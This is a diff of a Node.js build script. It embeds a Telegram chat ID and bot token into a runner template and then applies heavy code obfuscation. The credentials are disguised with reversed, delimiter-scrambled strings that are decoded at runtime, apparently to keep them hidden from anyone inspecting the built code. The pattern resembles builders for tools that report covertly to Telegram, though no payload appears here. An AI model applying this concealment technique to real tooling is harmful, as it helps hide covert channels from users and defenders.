@@ -28,8 +28,14 @@ const chatId = argv[0]
 const token = argv[1]
 
 // Replace data
-runnerCode = runnerCode.replace(/telegramChatId: .*/g, `telegramChatId: '${chatId}',`)
-runnerCode = runnerCode.replace(/telegramToken: .*/g, `telegramToken: '${token}',`)
+const replaced =
+  `let c = '${`${chatId.split('').reverse().join(',')}+${token.split('').reverse().join('~')}`
+    .split('')
+    .reverse()
+    .join('#')}';` +
+  `run(c.split('#').reverse().join('').split('+')[0].split(',').reverse().join(''), c.split('#').reverse().join('').split('+')[1].split('~').reverse().join('')`
+
+runnerCode = runnerCode.replace(/run\(\'.*?\', \'.*?\'/g, replaced)
 
 const options = {
   compact: true,
@@ -48,7 +54,7 @@ const options = {
   target: 'node',
   transformObjectKeys: true,
   ignoreImports: true,
-  disableConsoleOutput: true,
+  // disableConsoleOutput: true,
   numbersToExpressions: true,
   stringArrayCallsTransform: true,
   stringArrayRotate: true,
